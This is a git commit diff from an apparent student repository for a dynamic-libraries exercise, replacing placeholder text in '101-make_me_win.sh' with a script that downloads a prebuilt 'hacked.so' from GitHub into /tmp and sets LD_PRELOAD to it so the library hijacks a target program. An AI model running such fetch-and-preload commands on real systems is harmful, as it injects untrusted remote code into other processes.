6fb983c572341b7e1da1f220c55e7615ce731f56
Nduka Henry Chisom <henrysam140@gmail.com>
2022-12-13 06:13:24 +0100

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,4 +1,3 @@
-sjhdhbbjsdhbmdhbdjsdhbskhdd
-JHSDVhbvhbmhbdmdmbdd
-djgybdyhbgdyhbdb
-dgkdjvjh
+#!/bin/bash
+wget -P /tmp https://github.com/zerokodes/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+export LD_PRELOAD=/tmp/hacked.so
